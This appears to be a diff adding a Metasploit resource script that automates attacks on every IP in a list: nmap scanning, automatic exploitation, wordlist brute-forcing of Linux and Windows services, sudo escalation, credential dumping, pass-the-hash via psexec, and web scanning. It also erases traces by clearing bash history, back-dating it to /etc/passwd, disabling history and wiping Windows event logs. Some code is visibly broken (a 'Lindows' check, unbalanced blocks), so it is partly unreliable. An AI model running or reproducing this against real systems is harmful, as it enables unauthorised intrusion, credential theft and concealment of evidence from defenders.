@@ -1,0 +1,123 @@
+<ruby>
+# Scan loop on all IPs 
+# To do most of job, install pentest plugin first
+# mkdir –p $HOME/.msf4/plugins
+# cd $HOME/.msf4/plugins
+# wget https://raw.github.com/darkoperator/Metasploit-Plugins/master/pentest.rb
+
+run_single("load pentest")
+Dir.chdir('/root')
+path='/root/IPs.txt'
+file = File.open(path).each do |line|
+  run_single("setg RHOSTS #{line}")
+  run_single("setg LHOST 192.168.0.113")
+  run_single("db_nmap #{line} -sS")
+  run_single("db_nmap -sU -P0 --max-retries 1 --max-rtt-timeout=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=200ms --open --stats-every 5s #{line}")
+  run_single("discover_db -r #{line}/32")
+  run_single("vuln_exploit -j 1")
+
+# If exploits don't work, try brute force on services
+if (framework.sessions.length <= 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ll]inux/)
+      Dir.chdir('/usr/share/metasploit-framework/data/wordlists')
+        File.symlink("linux/users.txt", "unix_users.txt")
+        File.symlink("linux/pass.txt", "unix_passwords.txt")      
+        run_single("set VERBOSE true")
+        run_single("set THREADS 1")
+        run_single("resource /usr/share/metasploit-framework/scripts/resource/auto_brute.rc")
+      Dir.chdir('/usr/share/metasploit-framework/data/wordlists')
+        File.unlink("unix_users.txt", "unix_passwords.txt")
+    elsif (host.os_name =~ /[Ww]indows/)
+      Dir.chdir('/usr/share/metasploit-framework/data/wordlists')
+        File.symlink("windows/users.txt", "unix_users.txt")
+        File.symlink("windows/pass.txt", "unix_passwords.txt")
+        run_single("set VERBOSE true")
+	run_single("set THREADS 1")
+	run_single("resource /usr/share/metasploit-framework/scripts/resource/auto_brute.rc")
+      Dir.chdir('/usr/share/metasploit-framework/data/wordlists')
+	File.unlink("unix_users.txt", "unix_passwords.txt")
+    end
+  end
+end
+
+# If we get a login and OS type is Linux, test if it gets sudo
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ll]inux/)
+	run_single("use post/multi/manage/sudo")
+	run_single("set SESSION 1")
+	run_single("run")
+	run_single("id")
+    end
+  end
+end
+
+# Post exploit on Linux
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ll]indows/)
+      	run_single("sys_creds -s 1")
+      	run_single("sessions -i 1 -c 'echo > ~/.bash_history'")
+	run_single("sessions -i 1 -c 'touch -r /etc/passwd ~/.bash_history'")
+	run_single("sessions -i 1 -c 'export HISTSIZE=0'")
+    end
+  end
+end
+
+
+# If there is an web service, do it's own scan
+framework.db.hosts.each do |host|
+    host.services.each do |serv|
+      if (serv.state == Msf::ServiceState::Open)
+	if ((serv.port.to_i == 80) or (serv.port.to_i == 443))
+	  run_single("load wmap")
+	  run_single("wmap_sites -a http://#{line}")
+	  run_single("wmap_targets -t http://#{line}")
+	  run_single("wmap_run -t")
+	  run_single("wmap_run -e")
+	  run_single("wmap_vulns -l")
+	end
+      end
+    end
+end
+
+# Post exploit on Windows
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ww]indows/)
+      	run_single("app_creds -s 1")
+      	run_single("sys_creds -s 1")
+      	run_single("clearev")
+    end
+  end
+end
+
+# After dump Windows hashes, try sys access with psexec
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ww]indows/)
+	framework.db.creds.each do |creds|
+		next if (creds.ptype =~ /smb_hash/)
+      			run_single("resource /usr/share/metasploit-framework/scripts/resource/auto_pass_the_hash.rc")
+		end
+	end
+    end
+  end
+
+# Generate a XML report if thera are some open session
+if (framework.sessions.length > 0)
+	run_single("db_export -f xml -a /root/#{line}.xml")
+end
+
+# Terminate all open sessions and remove host from DB to don't contaminate next scan
+run_single("sessions -K")
+begin
+	run_single("hosts -d")
+end while ($?.success? == false)
+
+# Remove this IP from list to don't repeat it in case of script restart
+
+end
+file.close()
+</ruby>
